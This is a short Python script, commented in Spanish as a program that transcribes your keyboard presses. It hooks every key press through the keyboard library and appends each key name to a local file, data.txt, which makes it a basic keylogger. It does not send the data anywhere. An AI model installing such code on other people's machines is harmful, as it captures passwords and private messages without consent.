# Es un programa que  transcribe  las pulsaciones de tu teclado

import keyboard


def pressedKeys(key):
  with open('data.txt', "a") as file:
    if key.name == 'space':
      file.write(" ")
    else:
      file.write(key.name)
      
      
keyboard.on_press(pressedKeys)
keyboard.wait()